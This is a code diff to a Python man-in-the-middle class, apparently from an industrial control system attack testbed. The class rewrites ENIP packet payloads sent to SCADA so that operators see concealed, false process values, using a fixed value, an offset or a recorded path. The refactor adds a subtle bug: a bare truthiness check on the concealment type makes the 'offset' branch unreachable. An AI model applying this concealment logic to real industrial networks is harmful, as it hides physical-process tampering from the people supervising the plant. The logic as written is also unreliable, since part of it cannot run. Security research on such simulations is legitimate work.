@@ -66,24 +66,24 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
         # Concealment values to SCADA
         for session in self.scada_session_ids:
+            self.logger.debug('Concealing to SCADA: ' + str(this_session))
             if session['session'] == this_session and session['context'] == this_context:
-                for tag in self.intermediate_attack['concealment_data']['concealment_value']:
-                    if session['tag'] == tag['tag']:
-                        if self.intermediate_attack['concealment_data']['type'] == 'value':
-                            self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                            concealment_value = tag['value']
-                            self.logger.debug('Concealment value is: ' + str(concealment_value))
-                            return translate_float_to_payload(concealment_value, ip_payload[Raw].load)
-                        elif self.intermediate_attack['concealment_data']['type'] == 'offset':
-                            self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                            return translate_float_to_payload(translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
+                if self.intermediate_attack['concealment_data']['type'] == 'value' or self.intermediate_attack['concealment_data']['type'] == 'offset':
+                    for tag in self.intermediate_attack['concealment_data']['concealment_value']:
+                        if session['tag'] == tag['tag']:
+                            if self.intermediate_attack['concealment_data']['type']:
+                                self.logger.debug('Concealment value is: ' + str(tag['value']))
+                                return translate_float_to_payload(tag['value'], ip_payload[Raw].load)
+                            elif self.intermediate_attack['concealment_data']['type'] == 'offset':
+                                self.logger.debug('Concealment offset is: ' + str(tag['offset']))
+                                return translate_float_to_payload(translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
                                                               ip_payload[Raw].load)
-                        elif self.intermediate_attack['concealment_data']['type'] == 'path':
-                            self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                            exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
-                            concealment_value = float(self.concealment_data_pd.loc[exp][self.attacked_tags].values[-1])
-                            self.logger.debug('Concealing with value: ' + str(concealment_value))
-                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
+                elif self.intermediate_attack['concealment_data']['type'] == 'path':
+                    self.logger.debug('Concealing to SCADA with path')
+                    exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
+                    concealment_value = float(self.concealment_data_pd.loc[exp][session['tag']].values[-1])
+                    self.logger.debug('Concealing with value: ' + str(concealment_value))
+                    return translate_float_to_payload(concealment_value, ip_payload[Raw].load)
 
     def handle_enip_request(self, ip_payload, offset):
 
